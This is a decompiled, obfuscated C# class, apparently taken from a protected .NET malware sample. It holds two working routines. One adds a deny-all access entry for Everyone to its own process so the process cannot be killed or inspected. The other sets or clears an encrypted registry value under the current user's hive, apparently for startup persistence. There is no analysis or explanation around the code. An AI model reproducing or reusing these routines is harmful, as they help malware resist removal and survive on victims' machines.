using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace CXUnSAPANzkE;

internal sealed class gJWYxRJeVCkFVgzzr
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr obrEIsZHmYvzQ, int UmlgaKgPCgYtg, [Out] byte[] qnodLcxIVKYAM, uint ZGMhloApRMEz, out uint vFeUSfeIlLM);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr aQFQkqYvnZEM, int fTpVQdddazB, [In] byte[] dgofPiiKjV);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void tleqwHPZiMkR(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(getString_0(107403539));
			if (bool_0 && registryKey.GetValue(getString_0(107403494)) != null)
			{
				registryKey.DeleteValue(getString_0(107403494));
			}
			else
			{
				registryKey.SetValue(getString_0(107403494), getString_0(107406729));
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor IzcDvdhpcCMCQ(IntPtr intptr_0)
	{
		byte[] qnodLcxIVKYAM = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, qnodLcxIVKYAM, 0u, out var vFeUSfeIlLM);
		if ((long)vFeUSfeIlLM > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, qnodLcxIVKYAM = new byte[vFeUSfeIlLM], vFeUSfeIlLM, out vFeUSfeIlLM))
		{
			return null;
		}
		return new RawSecurityDescriptor(qnodLcxIVKYAM, 0);
	}

	private void bMYDEyHKPkGMGfzcZ(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void FbzTIYGIJLlE()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = IzcDvdhpcCMCQ(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			bMYDEyHKPkGMGfzcZ(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static gJWYxRJeVCkFVgzzr()
	{
		Strings.CreateGetStringDelegate(typeof(gJWYxRJeVCkFVgzzr));
	}
}
